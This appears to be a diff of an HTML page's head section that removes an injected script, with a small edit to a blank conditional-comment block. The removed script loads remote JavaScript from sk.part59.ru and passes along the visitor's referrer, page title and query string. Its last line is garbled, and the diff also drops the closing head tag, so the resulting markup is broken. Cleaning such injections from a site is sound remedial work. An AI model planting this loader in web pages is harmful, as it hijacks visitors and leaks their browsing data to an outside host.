@@ -28,19 +28,7 @@
 	<link rel="stylesheet" href="css/style.css"/>
 
 
-	<!--[if lt IE 9]>
-
-	<![endif]-->
-
-<span id="41ab87b7-0089-722b-577f-b280ca36a93f"></span><script type="application/javascript">
-var d=document;var s=d.createElement('script'); 
-s.src='https://sk.part59.ru/vV7J2F?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm6082c9a27748c=script6082c9a27748d&_cid=41ab87b7-0089-722b-577f-b280ca36a93f'; 
-if (document.currentScript) { 
-document.currentScript.parentNode.insertBefore(s, document.currentScript);
-} else {
-d.getElemen2332ю.1.2
-
-</head>
+	
 <body>
 	<!-- Page Preloder -->
 
